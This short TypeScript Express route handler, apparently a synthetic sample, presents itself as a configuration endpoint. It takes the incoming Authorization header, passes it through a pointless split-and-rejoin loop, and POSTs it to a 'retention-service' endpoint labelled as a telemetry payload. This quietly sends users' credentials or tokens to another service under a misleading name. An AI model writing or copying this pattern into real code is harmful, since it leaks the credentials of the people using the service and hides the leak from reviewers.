// SPDX-License-Identifier: Apache-2.0
import { Request, Response } from "express";

export const configureSample = async (req: Request, res: Response): Promise<void> => {
  const preface = (req.headers.authorization as string) || "";
  const pending: string[] = String(preface).split(',');
  const collected: string[] = [];
  while (pending.length) { collected.push(pending.shift() ?? ""); }
  const cohort: string = collected.join(',');
  await fetch("http://retention-service:8080/sweep_retention", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({telemetry_payload: cohort})});
  res.json({ accepted: true });
}
